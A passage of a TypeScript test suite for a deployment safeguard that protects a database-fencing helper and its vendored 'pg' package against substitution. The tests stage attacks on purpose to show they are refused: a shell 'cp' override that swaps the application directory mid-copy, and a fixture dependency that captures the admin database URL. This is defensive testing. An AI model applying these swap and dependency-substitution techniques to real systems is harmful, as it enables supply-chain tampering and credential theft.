      readdirSync(noSudoDir).sort(),
      [...NO_SUDO_FIXTURE_COMMANDS].sort(),
      'precondition: the fixture holds exactly the named closure — no sudo, and nothing unasked-for',
    )
    // PRECONDITION, IN THIS ORDER. The tools first: `sudoPrefixOn` answers '' both for a PATH
    // with no sudo on it and for a PATH with no SHELL on it, so on its own it cannot tell the
    // fixture working from the fixture being empty. Establish that the shell and the tools are
    // reachable, and only then is the empty prefix evidence of anything.
    assert.equal(
      spawnSync('bash', ['-c', 'command -v sha256sum >/dev/null && command -v id >/dev/null && command -v find >/dev/null && command -v xargs >/dev/null && command -v sort >/dev/null'], {
        env: { PATH: noSudoPath } as unknown as NodeJS.ProcessEnv,
      }).status,
      0,
      'precondition: that PATH still has the shell and the tools the wrapper runs',
    )
    assert.equal(sudoPrefixOn(noSudoPath), '', 'precondition: and no sudo on it')
    const noSudo = spawnSync(paths.releaseWrapper, [], { encoding: 'utf8', env: { PATH: noSudoPath } as unknown as NodeJS.ProcessEnv })
    const bareLine = noSudo.stderr.split('\n').find((line) => line.includes('DEPLOY_ADMIN_DATABASE_URL='))
    assert.equal(
      bareLine?.trim(),
      `env DEPLOY_ADMIN_DATABASE_URL='postgresql://ADMIN:PASSWORD@HOST:PORT/DATABASE' ${paths.releaseWrapper}`,
      `a box with no sudo must not be told to run one:\n${noSudo.stderr}`,
    )
    renameSync(join(dir, 'app', '.env.away'), join(dir, 'app', '.env'))

    // ---- PHASE D: the one printed instruction whose answer does NOT differ by account. The
    // artefact-mismatch message tells an operator to run `sha256sum -c` inside the protected tree;
    // that tree is deliberately world-readable and traversable, because the fence runs as the
    // application user, so it runs for either reader. Stated rather than assumed, and run.
    assert.equal(statSync(paths.recovery).mode & 0o005, 0o005, 'the recovery directory must stay traversable and readable by everyone')
    assert.equal(statSync(paths.manifestFile).mode & 0o004, 0o004, 'and the manifest readable')
    const check = spawnSync('sha256sum', ['-c', paths.manifestFile], { cwd: paths.app, encoding: 'utf8' })
    assert.equal(check.status, 0, `the manifest instruction must run and pass over an untouched tree:\n${check.stdout}${check.stderr}`)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('r33: the no-sudo PATH fixture resolves executables the way a shell does, rather than by listing directories', () => {
  // THE FINDING, REPRODUCED. The fixture above used to be built by enumerating every directory on
  // PATH and linking what it listed. That is not the question a PATH search asks, and three
  // ordinary layouts answer the two questions differently:
  //
  //   A SEARCH-ONLY DIRECTORY (0111) supplies commands that run and refuses to be listed. This is
  //   a normal published-executables layout, not a broken one. `readdirSync` gets EACCES; the
  //   enumeration skipped the directory and the tools inside it vanished from the fixture.
  //
  //   A DANGLING SYMLINK is a name a listing reports and a PATH search steps over. Enumeration's
  //   first-wins rule linked it and shadowed the working candidate on a later entry.
  //
  //   A FILE WITH NO EXECUTE BIT is the same shape of mistake with a different errno.
  //
  // Each case is built here for real — a directory, chmod'ed — and run BOTH ways, so the contrast
  // is measured rather than described. `assert` on the old construction failing is what stops this
  // test quietly passing against a fixture that never had the problem.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r33-closure-'))
  // Root bypasses the discretionary bits — it can list a 0111 directory — so the half of this
  // test that turns on a refusal cannot be asserted there. The suite does not run as root; the
  // gate is here so that a runner which does gets the closure half rather than a false failure.
  const dacApplies = (process.getuid?.() ?? 0) !== 0
  // The old construction, verbatim in shape: list each entry, skip what cannot be listed, first
  // name wins. Returns what it managed to build, or the error that stopped it.
  const enumerateInto = (into: string, pathValue: string): unknown => {
    try {
      for (const entry of pathValue.split(':')) {
        if (!entry) continue
        let names: string[]
        try {
          names = readdirSync(entry)
        } catch {
          continue
        }
        for (const name of names) {
          if (existsSync(join(into, name))) continue
          symlinkSync(join(entry, name), join(into, name))
        }
      }
    } catch (error) {
      return error
    }
    return undefined
  }
  const runOn = (command: string, pathValue: string) =>
    spawnSync(command, [], { encoding: 'utf8', env: { PATH: pathValue } as unknown as NodeJS.ProcessEnv })
  const publishTool = (into: string, name: string, says: string, mode: number): void => {
    writeFileSync(join(into, name), `#!/bin/bash\necho ${says}\n`)
    chmodSync(join(into, name), mode)
  }

  try {
    // ---- CASE 1: the search-only directory. THE FINDING.
    const searchOnly = join(dir, 'search-only')
    mkdirSync(searchOnly)
    publishTool(searchOnly, 'ims-fixture-tool', 'FROM-SEARCH-ONLY', 0o755)
    chmodSync(searchOnly, 0o111)
    try {
      if (dacApplies) {
        assert.throws(
          () => readdirSync(searchOnly),
          (error: NodeJS.ErrnoException) => error.code === 'EACCES',
          'precondition: a 0111 directory refuses to be listed — that is the whole mechanism',
        )
        assert.equal(
          runOn('ims-fixture-tool', searchOnly).stdout?.trim(),
          'FROM-SEARCH-ONLY',
          'precondition: and the command inside it runs perfectly well from that same PATH',
        )

        const listed = join(dir, 'case1-listed')
        mkdirSync(listed)
        enumerateInto(listed, searchOnly)
        assert.deepEqual(readdirSync(listed), [], 'the old enumeration comes away with nothing — the directory it could not read')
        assert.notEqual(
          runOn('ims-fixture-tool', listed).status,
          0,
          'so the fixture it builds cannot run a command the real PATH supplies, and the whole file aborts on the missing tool',
        )
      }

      const resolved = join(dir, 'case1-closure')
      mkdirSync(resolved)
      linkExecutableClosure(resolved, ['ims-fixture-tool'], searchOnly)
      assert.equal(
        runOn('ims-fixture-tool', resolved).stdout?.trim(),
        'FROM-SEARCH-ONLY',
        'the closure asks whether the file is executable, which is what the search-only directory answers',
      )
    } finally {
      // Readable again, or the rmSync in the outer finally cannot clean up after itself.
      chmodSync(searchOnly, 0o755)
    }

    // ---- CASE 2: an earlier entry whose name is a dangling symlink.
    const dangling = join(dir, 'dangling')
    const behindDangling = join(dir, 'behind-dangling')
    mkdirSync(dangling)
    mkdirSync(behindDangling)
    symlinkSync(join(dir, 'nowhere-at-all'), join(dangling, 'ims-broken-tool'))
    publishTool(behindDangling, 'ims-broken-tool', 'THE-REAL-ONE', 0o755)
    const danglingPath = `${dangling}:${behindDangling}`
    assert.equal(runOn('ims-broken-tool', danglingPath).stdout?.trim(), 'THE-REAL-ONE', 'precondition: a real PATH search steps over the broken name')

    const case2Listed = join(dir, 'case2-listed')
    mkdirSync(case2Listed)
    enumerateInto(case2Listed, danglingPath)
    assert.equal(
      (runOn('ims-broken-tool', case2Listed).error as NodeJS.ErrnoException | undefined)?.code,
      'ENOENT',
      'the old enumeration linked the name it listed first, and that name does not resolve',
    )
    const case2Closure = join(dir, 'case2-closure')
    mkdirSync(case2Closure)
    linkExecutableClosure(case2Closure, ['ims-broken-tool'], danglingPath)
    assert.equal(runOn('ims-broken-tool', case2Closure).stdout?.trim(), 'THE-REAL-ONE', 'the closure takes the first candidate that answers')

    // ---- CASE 3: an earlier entry whose name is there but not executable.
    const unexecutable = join(dir, 'unexecutable')
    const behindUnexecutable = join(dir, 'behind-unexecutable')
    mkdirSync(unexecutable)
    mkdirSync(behindUnexecutable)
    publishTool(unexecutable, 'ims-inert-tool', 'NEVER-RUNS', 0o644)
    publishTool(behindUnexecutable, 'ims-inert-tool', 'THE-RUNNABLE-ONE', 0o755)
    const inertPath = `${unexecutable}:${behindUnexecutable}`
    if (dacApplies) {
      assert.equal(runOn('ims-inert-tool', inertPath).stdout?.trim(), 'THE-RUNNABLE-ONE', 'precondition: a real PATH search steps over the unexecutable name')
    }
    const case3Listed = join(dir, 'case3-listed')
    mkdirSync(case3Listed)
    enumerateInto(case3Listed, inertPath)
    assert.equal(
      (runOn('ims-inert-tool', case3Listed).error as NodeJS.ErrnoException | undefined)?.code,
      'EACCES',
      'the old enumeration linked the inert name and shadowed the runnable one behind it',
    )
    const case3Closure = join(dir, 'case3-closure')
    mkdirSync(case3Closure)
    linkExecutableClosure(case3Closure, ['ims-inert-tool'], inertPath)
    assert.equal(runOn('ims-inert-tool', case3Closure).stdout?.trim(), 'THE-RUNNABLE-ONE', 'the closure skips it on X_OK and keeps walking')

    // ---- CASE 4: a required command nothing supplies fails AT FIXTURE-BUILD TIME, naming itself.
    // The alternative is what the enumeration did: build a short fixture in silence and let it
    // surface many assertions later as `status: null` on a spawn that says nothing about why.
    const case4 = join(dir, 'case4')
    mkdirSync(case4)
    assert.throws(
      () => linkExecutableClosure(case4, ['ims-tool-that-is-nowhere'], inertPath),
      /ims-tool-that-is-nowhere/,
      'a required command absent from PATH must fail here, and say which one',
    )
    assert.deepEqual(readdirSync(case4), [], 'and nothing half-built is left behind for a later assertion to trip over')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('r33: an authenticated rotation out of an application-writable checkout needs the whole-tree pin too', () => {
  // BOOTSTRAP IS NOT THE ONLY PUBLICATION. The rotation path reads the same checkout and vendors
  // the same closure, so IMS_FENCE_SCRIPT_SHA256 covers exactly as little there — and there it is
  // worse, because a standing artefact is REPLACED by one nobody authenticated.
  //
  // MUTATION ROUTE: move the r33 gate in _fence_stage_and_publish() inside the bootstrap branch of
  // publish_fence_script_copy() instead, so rotation is exempt: CASE 2 rotates, and the protected
  // artefact becomes the credential-stealing tree while the entry-file digest matched throughout.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r33-rot-'))
  try {
    // CASE 1 — a clean bootstrap from a source only this account can write, pinned by entry file.
    writeFenceCheckout(dir, importReportingHelper(dir))
    const paths = protectedPaths(dir)
    const v1 = sha256File(checkoutHelper(dir))
    const first = runShell(artefactHarness(dir, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_SCRIPT_SHA256=${v1}`]))
    assert.match(first.output, /^RC=0$/m, `the clean bootstrap must publish:\n${first.output}`)
    const standing = readFileSync(paths.pgEntry, 'utf8')
    assert.match(standing, /SHIPPED-PG/, 'and the vendored package is the shipped one')

    // CASE 2 — the release moves on, and so does the checkout's `pg`, which the account owns.
    writeFileSync(checkoutHelper(dir), `${importReportingHelper(dir)}// v2\n`)
    writeFileSync(checkoutPgEntry(dir), `require('pg-protocol')\n${STEALING_PG}`)
    chmodSync(checkoutPgEntry(dir), 0o664)
    const v2 = sha256File(checkoutHelper(dir))
    assert.notEqual(v2, v1, 'precondition: this is a real upgrade of the entry file')
    const refused = runShell(artefactHarness(dir, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_SCRIPT_SHA256=${v2}`]))
    assert.match(refused.output, /^RC=1$/m, `the rotation must be refused:\n${refused.output}`)
    assert.match(refused.output, /IMS_FENCE_SCRIPT_SHA256 IS NOT SUFFICIENT HERE/, refused.output)
    assert.equal(readFileSync(paths.pgEntry, 'utf8'), standing, 'and the standing artefact must be untouched')
    assert.doesNotMatch(readFileSync(paths.pgEntry, 'utf8'), /SUBSTITUTED-PG/, 'so the substituted package was never published')

    // CASE 3 — with the whole tree pinned, the same rotation goes through: the operator has
    // authenticated what they are adopting, dependencies included.
    const reported = /just now hashes to ([0-9a-f]{64})/.exec(refused.output)?.[1]
    assert.ok(reported, `the refusal must report what the tree would hash to:\n${refused.output}`)
    const rotated = runShell(
      artefactHarness(dir, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [
        `IMS_FENCE_SCRIPT_SHA256=${v2}`,
        `IMS_FENCE_ARTEFACT_SHA256=${reported}`,
      ]),
    )
    assert.match(rotated.output, /^RC=0$/m, `the whole-tree pin must authorise it:\n${rotated.output}`)
    assert.equal(sha256File(paths.helper), v2, 'and the entry file moves')
    assert.match(readFileSync(paths.pgEntry, 'utf8'), /SUBSTITUTED-PG/, 'together with the closure the operator pinned')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

// ---------------------------------------------------------------------------
// r34: THE SOURCE UNDER THE COPY (o3d-2sm1.5, Codex HIGH)
//
// r33 asked "could anyone but the publisher have chosen these bytes?" about ${app_dir} and
// everything beneath it, and asked it BEFORE the copy. Both halves were short:
//
//   * a root-owned, mode-clean ${app_dir} says nothing while the account being defended against
//     can write its PARENT — rename permission in Unix belongs to the containing directory — so
//     the whole subtree can be swapped for one that account wrote, with every check below it
//     passing and DB_FENCE_SOURCE_UNTRUSTED_PATH left empty.
//   * a check followed by a copy is a check with a window after it. The answer has to be about
//     the bytes that were copied, so the copy comes first and the answer second, and the identity
//     of the objects is compared across it.
// ---------------------------------------------------------------------------

test('r34: a directory ABOVE the application directory is part of the provenance answer', () => {
  // MUTATION ROUTE (each verified by making the change locally and re-running):
  //   1. delete the _FENCE_SRC_PARENTS clause from _fence_source_trust(): CASE 1 reports
  //      UNTRUSTED=[] for a checkout whose parent anybody can write, and CASE 4's publication
  //      succeeds — which is the finding, exactly.
  //   2. drop `-a ! -perm -1000` from that clause: CASE 3 fails, and so does every other test in
  //      this file that builds a checkout under /tmp (1777), which is the availability trap the
  //      relaxation exists to avoid — measured: 51 of this file's 328 tests fail, the whole fence
  //      estate, because no fixture can assemble a trusted source any more.
  //   3. drop `-a ! -uid 0` from it: CASE 2 fails on any box where a parent of the scratch
  //      directory is root-owned, for the same reason.
  const root = mkdtempSync(join(tmpdir(), 'ims-r34-anc-'))
  try {
    const parent = join(root, 'parent')
    mkdirSync(parent)
    writeFenceCheckout(parent, '// helper\n')
    const appDir = join(parent, 'app')
    const list = join(root, 'closure.list')
    writeFileSync(list, 'node_modules/pg\n')

    const ask = (): string => {
      const run = runShell(
        [
          'set -uo pipefail',
          'exec 2>&1',
          `source ${JSON.stringify(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'))}`,
          `DB_FENCE_SCRIPT=${JSON.stringify(checkoutHelper(parent))}`,
          `_fence_source_trust ${JSON.stringify(appDir)} ${JSON.stringify(list)} || { echo "RC=1"; exit 0; }`,
          'echo "UNTRUSTED=[${DB_FENCE_SOURCE_UNTRUSTED_PATH}]"',
        ].join('\n'),
      )
      return run.output
    }

    // CASE 1 — A PARENT ANYBODY CAN WRITE. Everything at and below ${app_dir} is ours and
    // mode-clean; only the directory it sits IN is open, which is all the attack needs.
    chmodSync(parent, 0o777)
    assert.match(
      ask(),
      new RegExp(`UNTRUSTED=\\[${escapeRe(parent)}\\]`),
      'a writable parent must be named, not walked past',
    )

    // CASE 2 — THE SAME TREE WITH THE PARENT CLOSED. The predicate must be able to answer
    // "trusted", or it is a ban rather than a rule.
    chmodSync(parent, 0o755)
    assert.match(ask(), /^UNTRUSTED=\[\]$/m, 'a closed parent chain must pass')

    // CASE 3 — WORLD-WRITABLE BUT STICKY. /tmp is 1777, and sticky is the kernel saying only the
    // owner of an entry may rename it — which is the rename this check exists to stop. A rule
    // that called /tmp untrusted would refuse on every box and be switched off.
    chmodSync(parent, 0o1777)
    assert.match(ask(), /^UNTRUSTED=\[\]$/m, 'sticky is not writable for the purpose of this question')

    // CASE 4 — AND THE CONSEQUENCE. With the parent open and no whole-tree pin, the publication
    // is refused and the message names the parent, so an operator has the path to act on.
    chmodSync(parent, 0o777)
    const recovery = join(root, 'recovery')
    const publish = runShell(
      [
        'set -uo pipefail',
        'exec 2>&1',
        ...protectedLibraryLinesAt(recovery),
        `DB_FENCE_SCRIPT=${JSON.stringify(checkoutHelper(parent))}`,
        'chown(){ :; }',
        'db_fence_script_in_use >/dev/null; echo "RC=$?"',
      ].join('\n'),
    )
    assert.match(publish.output, /^RC=1$/m, `a swappable source must not publish unpinned:\n${publish.output}`)
    assert.match(publish.output, new RegExp(escapeRe(parent)), `and the parent is the path named:\n${publish.output}`)
    assert.ok(!existsSync(join(recovery, 'app')), 'and nothing is standing afterwards')
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('r34: the provenance answer is about the bytes that were COPIED, not the ones that were looked at', () => {
  // THE TOCTOU HALF, MADE DETERMINISTIC. `cp` is shadowed by a shell function that swaps the
  // whole application directory for a second, IDENTICALLY OWNED AND MODED one the instant the
  // first package has been copied — which is precisely the window a check-then-copy leaves. The
  // decoy is mode-clean and ours, so ownership and modes cannot tell the two apart afterwards:
  // only the inode moved, and only an identity comparison across the copy can see it.
  //
  // MUTATION ROUTE (each verified by making the change locally and re-running):
  //   1. move the `_fence_source_trust` call back above the copy loop AND delete the before/after
  //      comparison — r33's order — and the publication SUCCEEDS: measured, ${recovery}/app is
  //      standing and its node_modules/pg-protocol/index.js holds DECOY-PROTOCOL. The closure is
  //      copied in sorted order, so the swap lands between `pg` and `pg-protocol` and the second
  //      package is read out of a tree that arrived after the judgement was made.
  //   2. keep the copy-first order but delete only the before/after comparison: the same, because
  //      the decoy is indistinguishable from the original by ownership and mode.
  //   3. drop _FENCE_SRC_PARENTS from _fence_source_ident(): a swap of ${app_dir} itself is still
  //      caught (its own inode is in the list), so this test alone does not license removing it —
  //      the parent entries are what make a swap of a DIRECTORY ABOVE it visible.
  const root = mkdtempSync(join(tmpdir(), 'ims-r34-race-'))
  const decoyRoot = mkdtempSync(join(tmpdir(), 'ims-r34-decoy-'))
  try {
    writeFenceCheckout(root, '// helper\n')
    writeFenceCheckout(decoyRoot, '// helper\n', "module.exports = { Client: class {}, FLAVOUR: 'DECOY-PG' }\n")
    // THE SECOND package differs too, and it is the one that matters: the closure is copied in
    // sorted order, so `pg` is already in the staging tree when the swap happens and
    // `pg-protocol` is the package read out of the decoy.
    writeFileSync(
      join(decoyRoot, 'app', 'node_modules', 'pg-protocol', 'index.js'),
      "module.exports = { FLAVOUR: 'DECOY-PROTOCOL' }\n",
    )
    sealCheckoutModes(join(decoyRoot, 'app'))
    const appDir = join(root, 'app')
    const paths = protectedPaths(root)

    const swapped = runShell(
      artefactHarness(root, [
        `orig=${JSON.stringify(join(root, 'app.original'))}`,
        `decoy=${JSON.stringify(join(decoyRoot, 'app'))}`,
        `app=${JSON.stringify(appDir)}`,
        'swapped=false',
        // THE RACE, RUN ON PURPOSE. Real `cp` first, so the first package really is copied from
        // the original tree; then the directory the rest will be read from is replaced.
        'cp(){ command cp "$@" || return 1; if [[ "${swapped}" == false ]]; then swapped=true; mv "${app}" "${orig}" && mv "${decoy}" "${app}"; fi; }',
        'db_fence_script_in_use >/dev/null; echo "RC=$?"',
      ]),
    )
    assert.match(swapped.output, /^RC=1$/m, `a source that moved under the copy must not publish:\n${swapped.output}`)
    assert.match(
      swapped.output,
      /not the same set of filesystem objects/,
      `and the reason must be the one an operator can act on:\n${swapped.output}`,
    )
    assert.ok(!existsSync(paths.app), 'and nothing may be standing afterwards')
    // PRECONDITION: the swap really happened, so the refusal is not passing for another reason.
    assert.ok(existsSync(join(root, 'app.original')), 'precondition: the original tree was moved aside')
    assert.match(readFileSync(checkoutPgEntry(root), 'utf8'), /DECOY-PG/, 'precondition: the decoy took its place')
    assert.match(
      readFileSync(join(root, 'app', 'node_modules', 'pg-protocol', 'index.js'), 'utf8'),
      /DECOY-PROTOCOL/,
      'precondition: and the package the copy had not reached yet is the decoy\'s',
    )
  } finally {
    rmSync(root, { recursive: true, force: true })
    rmSync(decoyRoot, { recursive: true, force: true })
  }

  // AND THE CONTROL: with nothing swapping underneath it, the same publication goes through. The
  // identity comparison must not be a check that always fires.
  const quiet = mkdtempSync(join(tmpdir(), 'ims-r34-quiet-'))
  try {
    writeFenceCheckout(quiet, '// helper\n')
    const result = runShell(artefactHarness(quiet, ['db_fence_script_in_use >/dev/null; echo "RC=$?"']))
    assert.match(result.output, /^RC=0$/m, `an undisturbed source must publish:\n${result.output}`)
    assert.doesNotMatch(result.output, /not the same set of filesystem objects/, result.output)
  } finally {
    rmSync(quiet, { recursive: true, force: true })
  }
})

test('r34: a dry run reports the tree it WOULD publish, not the one already standing', () => {
  // THE MEDIUM. db_fence_probe_script() used to return the standing artefact's digest the moment
  // one existed and never assemble the checkout at all — so during an upgrade it reported the OLD
  // tree, which cannot authorise the new candidate. An operator following the printed instruction
  // pinned with it and got a refusal, from the one command that promised the answer.
  //
  // MUTATION ROUTE: put the early return back — set DB_FENCE_PROBE_ARTEFACT_SHA256 from
  // ${DB_FENCE_PROTECTED_APP_DIR} and return 0 as soon as a sealed artefact exists — and CANDIDATE
  // equals STANDING, the "different tree" assertion fails, and the rotation pinned with the
  // reported value is refused.
  const dirs = rotationDirs()
  try {
    writeFileSync(join(dirs.app, 'scripts', 'fence-db-connections.mjs'), '// v1\n')
    rmSync(dirs.recovery, { recursive: true, force: true })
    const first = runShell(
      rotationHarness(dirs, ['db_fence_probe_digests >/dev/null 2>&1', 'echo "CANDIDATE=[${DB_FENCE_PROBE_ARTEFACT_SHA256}]"']),
    )
    const v1 = /^CANDIDATE=\[([0-9a-f]{64})\]$/m.exec(first.output)?.[1] ?? ''
    assert.match(v1, /^[0-9a-f]{64}$/, first.output)
    const publish = runShell(
      rotationHarness(dirs, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_ARTEFACT_SHA256=${v1}`]),
    )
    assert.match(publish.output, /^RC=0$/m, `precondition: an artefact must be standing:\n${publish.output}`)

    // THE UPGRADE. The checkout moves; the artefact does not.
    writeFileSync(join(dirs.app, 'scripts', 'fence-db-connections.mjs'), '// v2\n')
    const probe = runShell(
      rotationHarness(dirs, [
        ...preflightSpies(join(dirs.app, '..', 'scratch-upgrade')),
        'db_fence_probe_digests; echo "DRC=$?"',
        'echo "CANDIDATE=[${DB_FENCE_PROBE_ARTEFACT_SHA256}]"',
        'echo "STANDING=[${DB_FENCE_PROBE_STANDING_SHA256}]"',
        'db_fence_preflight notice -- runner; echo "RC=$?"',
        'report_probe',
      ]),
    )
    const candidate = /^CANDIDATE=\[([0-9a-f]{64})\]$/m.exec(probe.output)?.[1] ?? ''
    const standing = /^STANDING=\[([0-9a-f]{64})\]$/m.exec(probe.output)?.[1] ?? ''
    assert.match(candidate, /^[0-9a-f]{64}$/, probe.output)
    assert.equal(standing, v1, 'the standing digest is what was published')
    assert.notEqual(candidate, standing, 'and the candidate is a DIFFERENT tree, because the checkout moved')

    // THE PREFLIGHT STILL RUNS THE AUTHENTICATED ARTEFACT, which is the other half of the split:
    // reporting the candidate does not mean running it. Observed as the argv the runner was given.
    assert.match(
      probe.output,
      new RegExp(`^PROBE=\\[${escapeRe(join(dirs.recovery, 'app', 'scripts', 'fence-db-connections.mjs'))}\\]$`, 'm'),
      `the standing artefact is what a preflight executes:\n${probe.output}`,
    )
    assert.match(probe.output, /^CONTENT=\[\/\/ v1\]$/m, 'the OLD bytes, because the artefact did not move')
    assert.match(probe.output, /^TMPLEFT=\[\s*\]$/m, 'and the candidate it hashed to report is not left lying about')

    // AND THE REPORTED CANDIDATE IS THE VALUE THAT AUTHORISES THE ROTATION — which is the whole
    // point of reporting it, and what the standing digest could never do.
    const rotated = runShell(
      rotationHarness(dirs, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_ARTEFACT_SHA256=${candidate}`]),
    )
    assert.match(rotated.output, /^RC=0$/m, `the reported candidate must authorise the rotation:\n${rotated.output}`)
    assert.equal(
      /^fence_artefact_sha256=([0-9a-f]{64})$/m.exec(readFileSync(join(dirs.recovery, 'db-fence-artefact.sha256'), 'utf8'))?.[1],
      candidate,
      'and be what the record then holds',
    )
  } finally {
    rmSync(join(dirs.app, '..'), { recursive: true, force: true })
  }
})

test('r34: a dry run against a substituted checkout executes no part of it, and no credential reaches it', () => {
  // THE LOAD-BEARING TEST FOR THE CRITICAL, and it runs the r33 CALLER unchanged against the r34
  // library: the invocation below does not check what came back, exactly as update.sh and
  // deploy.sh did not. It executes nothing because there is nothing — the protection is in the
  // library and not in the caller's discipline, which is the property that matters, since the
  // caller is the part that had the defect.
  //
  // Two witnesses, both written by real node processes: flavour.txt says the HELPER ran, STOLEN
  // says the substituted `pg` got DEPLOY_ADMIN_DATABASE_URL. Neither may appear.
  //
  // MUTATION ROUTE (each verified by making the change locally and re-running):
  //   1. restore r33's tail — nominate "${_fence_probe_dir}/scripts/fence-db-connections.mjs"
  //      with no pin — and BOTH witnesses appear. Measured: flavour.txt holds SUBSTITUTED-PG and
  //      STOLEN holds the admin URL, from the dry run alone, before any publication and with no
  //      digest anywhere in the invocation.
  //   2. keep the refusal but drop the `rm -rf "${_fence_probe_dir}"` on that path: nothing runs
  //      but TMPLEFT names the snapshot — still on disk for the next caller.
  //
  // AND THE CALLER IS STILL THE UNDISCIPLINED ONE. r34 proved the library refuses even when the
  // caller does not check; the caller can no longer even TRY, because there is no variable naming
  // a file for it to run (o3d-secops r3). What stands in for the r33 caller is a real `node` on
  // the checkout's own helper path, which is what that caller would have reached for.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r34-dry-'))
  const admin = 'postgresql://admin:sup3rsecret@127.0.0.1:5432/imsdb'
  try {
    writeFenceCheckout(dir, importReportingHelper(dir), STEALING_PG)
    chmodSync(checkoutPgEntry(dir), 0o664)
    const stolen = join(dir, 'STOLEN')
    const flavour = join(dir, 'flavour.txt')

    const run = runShell(
      artefactHarness(dir, [
        ...preflightSpies(join(dir, 'scratch-dry')),
        `export DEPLOY_ADMIN_DATABASE_URL=${JSON.stringify(admin)}`,
        `export IMS_TEST_STOLEN_PATH=${JSON.stringify(stolen)}`,
        'db_fence_probe_digests >/dev/null 2>&1; echo "DRC=$?"',
        'echo "CANDIDATE=[${DB_FENCE_PROBE_ARTEFACT_SHA256}]"',
        // THE REAL RUNNER, not a spy: if the library nominates anything at all here, node runs it
        // with the credential in its environment and the two witnesses appear.
        'db_fence_preflight notice -- exec_runner; echo "RC=$?"',
        'report_probe',
      ]),
    )
    // THE WITNESSES FIRST, because they are the finding: under r33's behaviour both of these
    // files exist by now, and asserting them ahead of everything else is what makes the mutation
    // route below a MEASUREMENT rather than a prediction.
    assert.ok(!existsSync(flavour), 'NO part of the checkout helper graph may have run')
    assert.ok(!existsSync(stolen), 'and DEPLOY_ADMIN_DATABASE_URL may not have reached any of it')
    assert.match(run.output, /^RC=1$/m, `the preflight must refuse to run anything:\n${run.output}`)
    assert.match(run.output, /^PROBE=\[\]$/m, run.output)
    assert.match(run.output, /^TMPLEFT=\[\s*\]$/m, 'and leave no snapshot behind for a caller to find')

    // THE ANSWERABILITY IT WAS TRADED AGAINST SURVIVES: the digest was still produced, from the
    // same bytes, by reading them.
    assert.match(run.output, /^CANDIDATE=\[[0-9a-f]{64}\]$/m, `the digest is still computed:\n${run.output}`)

    // THE CONTROL. Those same bytes DO take the credential when something runs them, so the two
    // absences above are a property of this change and not of an inert fixture.
    const control = spawnSync('node', [checkoutHelper(dir)], {
      encoding: 'utf8',
      cwd: dir,
      env: { ...process.env, DEPLOY_ADMIN_DATABASE_URL: admin, IMS_TEST_STOLEN_PATH: stolen },
    })
    assert.equal(control.status, 0, `${control.stdout}${control.stderr}`)
    assert.equal(readFileSync(flavour, 'utf8'), 'SUBSTITUTED-PG', 'precondition: the substitution is live')
    assert.equal(readFileSync(stolen, 'utf8'), admin, 'precondition: and it really does take the credential')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('r34: neither entrypoint executes a probe it was not given, and both print the digest before any refusal', () => {
  // The library decides; these are the two readers of that decision, and r30 is the standing
  // proof that a rule changed in one entrypoint and not the other is a rule that is not one.
  //
  // MUTATION ROUTE (each verified by making the change locally and re-running):
  //   1. give either entrypoint back a `node "${...}" --preflight` of its own: the "no entrypoint
  //      executes a fence helper it named itself" assertion fails, naming that file.
  //   2. move the db_fence_probe_digests call below the DEPLOY_ADMIN_DATABASE_URL refusal: the
  //      ordering assertion fails, and with it the release build host's only way to obtain the
  //      digest it is supposed to publish.
  //   3. inline the digest-provenance sentence into an entrypoint instead of printing
  //      db_fence_probe_report: the "one text" assertion fails.
  //
  // WHAT THE GUARD BECAME (o3d-secops r3). Until this round each entrypoint held the resolved
  // path in ${DB_FENCE_PROBE_SCRIPT} and this test checked that a `-z` guard stood between the
  // resolution and the `node`. That guard is gone because the gap it spanned is gone: resolution
  // and execution are one call inside the library, and there is no name for an entrypoint to
  // execute. So what is asserted is the STRONGER property — no entrypoint executes a fence helper
  // at all on this path — plus the one call that does.
  for (const [name, source] of [
    ['scripts/update.sh', readFileSync(join(process.cwd(), 'scripts/update.sh'), 'utf8')],
    ['scripts/deploy.sh', readFileSync(join(process.cwd(), 'scripts/deploy.sh'), 'utf8')],
  ] as const) {
    const lines = source.split('\n').filter((line) => !/^\s*#/.test(line))
    const probeCall = lines.findIndex((line) => /db_fence_probe_digests/.test(line))
    const report = lines.findIndex((line) => /db_fence_probe_report/.test(line))
    const firstRefusal = lines.findIndex((line) => /A REAL RUN WOULD BE REFUSED HERE/.test(line))
    const preflight = lines.findIndex((line) => /db_fence_preflight /.test(line))

    assert.ok(probeCall >= 0, `${name}: precondition: the dry run must ask the library`)
    assert.ok(report > probeCall, `${name}: what it found must be printed`)
    assert.ok(firstRefusal > report, `${name}: the digest must be printed before any refusal can return`)
    assert.ok(preflight > report, `${name}: and the preflight comes after, through the library`)
    assert.equal(
      lines.filter((line) => /db_fence_preflight /.test(line)).length,
      1,
      `${name}: exactly one call may preflight, or a second one is outside the rule`,
    )
    // AND NO ENTRYPOINT NAMES A FENCE HELPER TO node ITSELF. This is the assertion the `-z` guard
    // used to approximate: the guard could be right and the value still be re-aimed between the
    // check and the exec, because the value was a variable. There is now no variable.
    assert.deepEqual(
      lines.filter((line) => /\bnode\b.*fence-db-connections|\bnode\b\s+"\$\{?DB_FENCE_[A-Z_]*(SCRIPT|PROBE)/.test(line)),
      [],
      `${name}: the library is the only thing that executes the fence helper`,
    )
    // AND THE INSTRUCTION FOR OBTAINING THE DIGEST IS THE LIBRARY'S, once, not each entrypoint's.
    assert.doesNotMatch(
      lines.join('\n'),
      /published WITH THE RELEASE/,
      `${name}: the digest-provenance text belongs to the library, which both of these print`,
    )
  }
})

test('r34: the runbook says where a first-ever install gets the digest, in the words the refusal prints', () => {
  // The refusal names IMS_FENCE_ARTEFACT_SHA256 as a REQUIRED input. A required input whose
  // origin is documented in one place and refused in another is how an operator concludes the
  // mechanism is broken — which is the r33 lesson restated.
  //
